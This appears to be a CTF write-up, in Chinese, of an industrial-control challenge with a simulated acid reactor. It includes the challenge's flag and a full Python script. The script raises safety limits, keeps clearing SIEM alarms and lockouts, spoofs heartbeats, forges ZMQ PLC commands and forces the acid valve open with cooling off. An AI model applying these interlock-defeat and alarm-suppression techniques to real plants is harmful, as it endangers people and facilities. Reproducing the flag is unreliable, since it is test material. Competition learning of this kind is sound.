> 来源：https://github.com/fjh1997/nepctf2026-writeup/blob/main/writeup/WriteUp_%E5%AE%8C%E6%95%B4%E8%87%AA%E5%8C%85%E5%90%AB.md
> 以下为原始完整 writeup 中 #23 的连续章节摘录；代码未执行。

## #23 虚验室制取稀硫酸

### 1. 题目信息
- **题目名称**：虚验室制取稀硫酸
- **题目类型**：ICS
- **最终 Flag**：`NepCTF{d5ed8d22-0bc2-0e1e-d663-0614446cb241}`

### 2. 题目分析
ICS 虚验室：SSH 三个号——`tui` 看板、`ctf` 跑脚本、`upload` 丢文件；内部是 127.1.0.x 上的 S7/ZMQ 软 PLC。目标是**真实反应釜**温度 >90 且液位 >100，同时 SIEM 不能炸；flag 刷在 tui 公告板。

这里有个超级大坑：一开始我走 `pwn_recover` 硬写 Vessel_Temp / Vessel_Level，状态数字是好看了，SIEM 立刻 ACTIVE，公告板只骂人不出 flag。血泪教训喵。

### 3. 解题思路
正确姿势是**湿接触 / 自然开酸**路径（`pwn_natural`）：

- 先抬 MAX_SAFE_* 等安全限；
- 开酸、控水、搅拌，让物理过程自己爬；
- 全程清 SIEM latch / 保 heartbeat；
- **并行** `ssh -tt tui` 盯公告板。

不要 force 写 VT/VL 当主解。

### 4. 解题过程
复现和比赛 AC 同一条链：

1. POST 开实例，等 SSH 起来。
2. SFTP 上传 `pwn_natural.py` 到 `/files/`。
3. ctf：`micropython /files/pwn_natural.py --hold 90`。
4. 另开终端：`ssh -tt tui@HOST -p PORT`，刷到 `NepCTF{...}`。
5. 提交。注意远程实例 flag 和比赛当时那串可以不一样（动态），这是正常的。

比赛 flag：`NepCTF{d5ed8d22-0bc2-0e1e-d663-0614446cb241}`。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/23/pwn_natural.py`
```python
#!/usr/bin/env python3
"""#23 natural wet-contact overfeed (no Vessel_*/Sensor_* force-ramp).

Hypothesis for SIEM 4006:
  - Fast force-writes of Vessel_Temp/Level trip rate/integrity SIEM
  - Intended path: raise MAX_SAFE_*, open acid wet contacts, let physics cook

Steps:
  1) Raise all safe/high/critical limits BEFORE opening acid
  2) Clear SIEM/latch fields continuously
  3) Keep heartbeat / CMD_Start / agitator
  4) Open acid fully, water off, cooling off, block product drawdown
  5) Optionally boost Acid_Flow / Reaction_Rate inputs (wet contacts)
  6) Do NOT write Vessel_Temp/Level or Sensor_* process values
  7) Hold until VT>90 and VL>100 with SIEM=0 latched=0
"""

import struct
import sys
import time

try:
    import socket
except ImportError:
    try:
        import usocket as socket
    except ImportError:
        socket = None

HW = "/hardware/%s.snapshot"
ZMQ_CMD = {
    "h2so4_controller": ("127.1.0.20", 6301),
    "scada_panel": ("127.1.0.21", 6311),
    "reactor_vessel": ("127.1.0.22", 6321),
    "temperature_sensor": ("127.1.0.26", 6331),
    "level_sensor": ("127.1.0.27", 6341),
    "water_valve": ("127.1.0.23", 6351),
    "acid_valve": ("127.1.0.24", 6361),
    "agitator_drive": ("127.1.0.25", 6371),
}


def pf(v):
    return struct.pack("<f", float(v))


def pi(v):
    return struct.pack("<h", int(v))


def pu(v):
    return bytes([int(v) & 0xFF])


def openw(n):
    return open(HW % n, "r+b")


def put(f, o, d):
    f.seek(o)
    f.write(d)


def getf(n, o):
    with open(HW % n, "rb") as f:
        f.seek(o)
        return struct.unpack("<f", f.read(4))[0]


def getu(n, o):
    with open(HW % n, "rb") as f:
        f.seek(o)
        return f.read(1)[0]


def geti(n, o):
    with open(HW % n, "rb") as f:
        f.seek(o)
        return struct.unpack("<h", f.read(2))[0]


def status(tag):
    vt = getf("reactor_vessel", 24)
    vl = getf("reactor_vessel", 28)
    st = getf("h2so4_controller", 12)
    sl = getf("h2so4_controller", 16)
    siem = getu("h2so4_controller", 56)
    lock = getu("h2so4_controller", 57)
    evt = geti("h2so4_controller", 54)
    af = getf("reactor_vessel", 12)
    acid = getf("acid_valve", 8)
    openv = getu("acid_valve", 14)
    cool = getu("reactor_vessel", 36)
    batch = getu("reactor_vessel", 37)
    draw = getu("reactor_vessel", 64)
    ssiem = getu("scada_panel", 12)
    # last event @ scada+102 (observed latched dump)
    try:
        last = geti("scada_panel", 102)
    except Exception:
        last = -1
    lat = getu("scada_panel", 64)
    print(
        "[%s] VT=%.2f VL=%.2f ST=%.2f SL=%.2f | SIEM=%d lock=%d evt=%d | "
        "sSIEM=%d last=%d lat64=%d | AF=%.1f acid=%.1f open=%d cool=%d batch=%d draw=%d"
        % (tag, vt, vl, st, sl, siem, lock, evt, ssiem, last, lat, af, acid, openv, cool, batch, draw)
    )
    return vt, vl, siem, lock, evt


def clear_siem(fc, fs):
    put(fc, 56, pu(0))
    put(fc, 57, pu(0))
    put(fc, 53, pu(0))
    put(fc, 54, pi(0))
    put(fs, 12, pu(0))
    put(fs, 14, pi(0))
    # best-effort clear latched / last-event area observed in dumps
    for o in (64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 100, 101):
        put(fs, o, pu(0))
    put(fs, 102, pi(0))
    put(fs, 104, pi(0))


def raise_limits(fc, fr, ft, fl, fa):
    put(fc, 100, pf(999.0))  # MAX_SAFE_TEMP
    put(fc, 104, pf(999.0))  # MAX_SAFE_LEVEL
    put(fc, 108, pf(100.0))  # MAX_ACID_VALVE
    put(fc, 112, pf(999.0))
    put(fc, 116, pf(999.0))
    put(fc, 120, pi(60000))
    put(fr, 76, pf(500.0))  # MAX_LEVEL
    put(fr, 84, pf(500.0))  # MAX_TEMP
    put(fr, 80, pf(0.0))
    put(ft, 12, pu(0))  # no inject
    put(ft, 40, pf(999.0))
    put(ft, 44, pf(999.0))
    put(ft, 20, pu(1))
    put(ft, 21, pu(0))
    put(ft, 22, pu(0))
    put(fl, 12, pu(0))
    put(fl, 40, pf(0.0))
    put(fl, 44, pf(999.0))
    put(fl, 48, pf(999.0))
    put(fl, 20, pu(1))
    put(fl, 21, pu(0))
    put(fl, 22, pu(0))
    put(fa, 32, pf(100.0))  # MAX_SAFE_OPENING
    put(fa, 36, pf(1.0))  # FLOW_PER_PERCENT


# optional light ZMQ
def gai(h, p):
    return socket.getaddrinfo(h, p, 0, socket.SOCK_STREAM)[0][-1]


def rex(s, n):
    b = b""
    while len(b) < n:
        c = s.recv(n - len(b))
        if not c:
            raise OSError("closed")
        b += c
    return b


def greet_recv(s):
    return rex(s, 64)


def greet_send(s, stype):
    zg = bytearray(64)
    zg[0] = 0xFF
    zg[9] = 0x7F
    zg[10] = 3
    zg[11] = 0
    zg[12:16] = b"NULL"
    s.send(bytes(zg))
    meta = b"\x0bSocket-Type" + struct.pack("!I", len(stype)) + stype
    body = b"\x05READY" + meta
    s.send(bytes([0x04, len(body)]) + body)


def rframe(s):
    fl = rex(s, 1)[0]
    if fl & 2:
        ln = struct.unpack("!Q", rex(s, 8))[0]
    else:
        ln = rex(s, 1)[0]
    return fl, (rex(s, ln) if ln else b"")


def sframe(s, data, more=False):
    fl = 0x01 if more else 0x00
    if len(data) > 255:
        s.send(bytes([fl | 0x02]) + struct.pack("!Q", len(data)) + data)
    else:
        s.send(bytes([fl, len(data)]) + data)


def smsg(s, parts):
    for i, p in enumerate(parts):
        sframe(s, p, more=(i < len(parts) - 1))


def connect_pub(host, port, timeout=1.5):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect(gai(host, port))
    greet_recv(s)
    greet_send(s, b"PUB")
    for _ in range(4):
        try:
            fl, data = rframe(s)
            if b"READY" in data:
                break
        except Exception:
            break
    return s


def body_real(inst, field, offset, value, cmd=0):
    if not isinstance(inst, (bytes, bytearray)):
        inst = inst.encode()
    if not isinstance(field, (bytes, bytearray)):
        field = field.encode()
    out = bytearray()
    out += struct.pack("<III", cmd, len(inst), 0) + inst
    out += struct.pack("<II", len(field), 0) + field
    out += struct.pack("<II", offset, 0)
    out += struct.pack("<II", 4, 0)
    out += struct.pack("<f", float(value))
    return bytes(out)


def body_bool(inst, field, offset, value, cmd=1):
    if not isinstance(inst, (bytes, bytearray)):
        inst = inst.encode()
    if not isinstance(field, (bytes, bytearray)):
        field = field.encode()
    out = bytearray()
    out += struct.pack("<III", cmd, len(inst), 0) + inst
    out += struct.pack("<II", len(field), 0) + field
    out += struct.pack("<II", offset, 0)
    out += bytes([0, int(value) & 0xFF])
    return bytes(out)


def pub_real(pub, dev, field, offset, value, cmd=0):
    smsg(pub, [("cmd/%s/" % dev).encode(), body_real(dev + "_instance", field, offset, value, cmd)])


def pub_bool(pub, dev, field, offset, value, cmd=1):
    smsg(pub, [("cmd/%s/" % dev).encode(), body_bool(dev + "_instance", field, offset, value, cmd)])


def open_pubs():
    pubs = {}
    if not socket:
        return pubs
    for n, (ip, cmd) in ZMQ_CMD.items():
        try:
            pubs[n] = connect_pub(ip, cmd, timeout=1.2)
            print("[pub]", n, "ok")
        except Exception as e:
            print("[pub]", n, "FAIL", e)
    return pubs


def main():
    hold = 120.0
    acid_target = 100.0
    use_zmq = True
    args = sys.argv[1:]
    i = 0
    while i < len(args):
        if args[i] == "--hold" and i + 1 < len(args):
            hold = float(args[i + 1])
            i += 2
        elif args[i] == "--acid" and i + 1 < len(args):
            acid_target = float(args[i + 1])
            i += 2
        elif args[i] == "--no-zmq":
            use_zmq = False
            i += 1
        else:
            i += 1

    print("=== pwn_natural hold=%.1f acid=%.1f ===" % (hold, acid_target))
    status("base")

    pubs = open_pubs() if use_zmq else {}

    fc = openw("h2so4_controller")
    fr = openw("reactor_vessel")
    ft = openw("temperature_sensor")
    fl = openw("level_sensor")
    fa = openw("acid_valve")
    fw = openw("water_valve")
    fg = openw("agitator_drive")
    fs = openw("scada_panel")

    # Phase 0: only raise limits + clear SIEM for a while (no process push)
    t_pre = time.time()
    hb = 0
    while time.time() - t_pre < 3.0:
        hb ^= 1
        raise_limits(fc, fr, ft, fl, fa)
        clear_siem(fc, fs)
        put(fc, 24, pu(hb))
        put(fc, 26, pi(99))
        put(fc, 120, pi(60000))
    status("limits_only")

    # Phase 1: start process, ramp acid opening slowly via wet contacts
    t0 = time.time()
    n = 0
    acid = 5.0
    peak = (0.0, 0.0)
    win = 0
    while time.time() - t0 < hold:
        hb ^= 1
        # slow acid ramp over ~20s
        elapsed = time.time() - t0
        if acid < acid_target:
            # ~5%/s
            acid = min(acid_target, 5.0 + elapsed * 5.0)

        raise_limits(fc, fr, ft, fl, fa)
        clear_siem(fc, fs)

        # controller run + heartbeat + high SP (PID may open acid further)
        put(fc, 8, pu(1))
        put(fc, 9, pu(0))
        put(fc, 24, pu(hb))
        put(fc, 26, pi(99))
        put(fc, 28, pf(150.0))  # SetPoint_Temp
        put(fc, 48, pf(acid))  # Valve_Acid cmd
        put(fc, 44, pu(0))  # Valve_Water
        put(fc, 52, pu(1))  # agitator

        # acid valve wet contacts
        put(fa, 8, pf(acid))
        put(fa, 28, pf(acid))
        put(fa, 13, pu(1))  # supply ready
        put(fa, 12, pu(0))  # no fault
        put(fa, 24, pu(0))

        # water closed, agitator on
        put(fw, 8, pu(0))
        put(fw, 10, pu(1))
        put(fg, 8, pu(1))
        put(fg, 12, pf(100.0))

        # reactor: enable heat path, disable drains — DO NOT write Vessel_*
        put(fr, 36, pu(0))  # cooling off
        put(fr, 37, pu(0))  # batch ready off
        put(fr, 64, pu(0))  # product drawdown off
        put(fr, 16, pu(1))  # agitator running
        put(fr, 17, pu(0))
        put(fr, 8, pf(0.0))  # water flow 0
        # feed acid flow proportional to opening (wet contact)
        put(fr, 12, pf(acid * 0.5))
        put(fr, 68, pf(0.0))
        put(fr, 100, pf(0.0))  # no product consume
        put(fr, 92, pf(999.0))  # never ready
        put(fr, 96, pf(0.0))
        # mild reaction boost if writable (constant param)
        put(fr, 32, pf(2.0))
        put(fr, 72, pf(25.0))  # ambient

        if pubs and n % 50 == 0:
            try:
                if "h2so4_controller" in pubs:
                    p = pubs["h2so4_controller"]
                    pub_bool(p, "h2so4_controller", "SIEM_Trigger", 56, 0)
                    pub_bool(p, "h2so4_controller", "Security_Lockout", 57, 0)
                    pub_bool(p, "h2so4_controller", "CMD_Start", 8, 1)
                    pub_bool(p, "h2so4_controller", "CMD_Stop", 9, 0)
                    pub_bool(p, "h2so4_controller", "SCADA_Heartbeat", 24, hb)
                    pub_real(p, "h2so4_controller", "MAX_SAFE_TEMP", 100, 999.0)
                    pub_real(p, "h2so4_controller", "MAX_SAFE_LEVEL", 104, 999.0)
                    pub_real(p, "h2so4_controller", "MAX_ACID_VALVE", 108, 100.0)
                    pub_real(p, "h2so4_controller", "Valve_Acid", 48, acid)
                    pub_real(p, "h2so4_controller", "SetPoint_Temp", 28, 150.0)
                if "acid_valve" in pubs:
                    pub_real(pubs["acid_valve"], "acid_valve", "Valve_AcidCmd", 8, acid)
                    pub_real(pubs["acid_valve"], "acid_valve", "MAX_SAFE_OPENING", 32, 100.0)
                if "water_valve" in pubs:
                    pub_bool(pubs["water_valve"], "water_valve", "Valve_WaterCmd", 8, 0)
                if "agitator_drive" in pubs:
                    pub_bool(pubs["agitator_drive"], "agitator_drive", "Motor_AgitatorCmd", 8, 1)
                if "scada_panel" in pubs:
                    pub_bool(pubs["scada_panel"], "scada_panel", "SIEM_Trigger", 12, 0)
            except Exception:
                pass

        n += 1
        if n % 1500 == 0:
            vt, vl, siem, lock, evt = status("t+%.1f acid=%.1f" % (elapsed, acid))
            if vt > peak[0]:
                peak = (vt, peak[1])
            if vl > peak[1]:
                peak = (peak[0], vl)
            if vt > 90.0 and vl > 100.0 and siem == 0 and lock == 0 and evt == 0:
                win += 1
                print("[+] NATURAL WIN streak=%d — check tui" % win)
            else:
                win = 0

    status("final")
    print("[peak] T=%.2f L=%.2f iters=%d" % (peak[0], peak[1], n))
    for f in (fc, fr, ft, fl, fa, fw, fg, fs):
        try:
            f.close()
        except Exception:
            pass


if __name__ == "__main__":
    main()
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

